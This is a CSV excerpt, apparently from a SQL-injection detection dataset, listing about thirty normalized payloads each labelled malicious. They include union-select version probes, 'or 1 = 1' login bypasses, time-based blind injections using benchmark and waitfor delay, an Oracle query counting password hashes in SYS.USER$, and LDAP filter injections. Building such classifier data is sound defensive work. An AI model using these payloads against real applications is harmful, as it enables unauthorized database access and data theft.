row_index,payload_norm,label,sqli_type_hint
720,"union ( select NULL, NULL, NULL, ( select @@version ) ) --",1,
721,"select * from users where id = 1 union select @ $$,version ( ) -- 1",1,
722,"select * from users where id = 1 or ""@#"" or 1 = 1 -- 1",1,
723,"1 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
724,"select * from users where id = 1 union select 1<@.,version ( ) -- 1",1,
725,"select * from users where id = 1 or 1#""@ union select 1,version ( ) -- 1",1,
726,"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1,
727,"select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1,
728,"admin"" ) or ""1"" = ""1""/*",1,
729,""" or ""a"" = ""a",1,
730,"select * from users where id = 1 or 1#""$ union select 'a',version ( ) -- 1",1,
731,"benchmark ( 10000000,MD5 ( 1 ) ) #",1,
732,exec xp,1,
733,"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1,
734,"select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1,
735,hi' or 'a' = 'a,1,
736,or ''*',1,
737,sqlattempt1,1,
738,admin' or 1 = 1--,1,
739,"select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1,
740,1' or '1' = '1,1,
741,"select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",1,
742,",@variable",1,
743,*|,1,
744,"select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",1,
745,* ( | ( mail = * ) ),1,
746,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 8 ) waitfor delay '0:0:2' --",1,
747,"select * from users where id = 1 or 1#"", union select 1,version ( ) -- 1",1,
748,"select * from users where id = 1 or 1#""1 union select version ( ) ,version ( ) -- 1",1,
749,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( PASSWORD ) ) FROM SYS.USER$ ) ) AND 'i' = 'i,1,
